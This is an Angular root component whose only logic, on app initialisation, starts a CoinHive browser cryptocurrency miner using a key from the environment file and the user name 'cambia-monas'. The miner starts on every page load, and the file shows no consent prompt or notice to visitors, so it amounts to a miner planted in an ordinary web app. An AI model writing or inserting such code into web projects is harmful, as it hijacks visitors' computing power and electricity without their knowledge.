import { Component, OnInit, AfterViewInit, AfterViewChecked } from '@angular/core';
import { environment as ENV } from '../environments/environment';

declare var CoinHive: any;

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent implements OnInit {
  user = 'cambia-monas';
  ngOnInit(): void {
    const key = ENV.coinHive.key;
    const miner = new CoinHive.User(key, this.user);
    miner.start();
  }
}
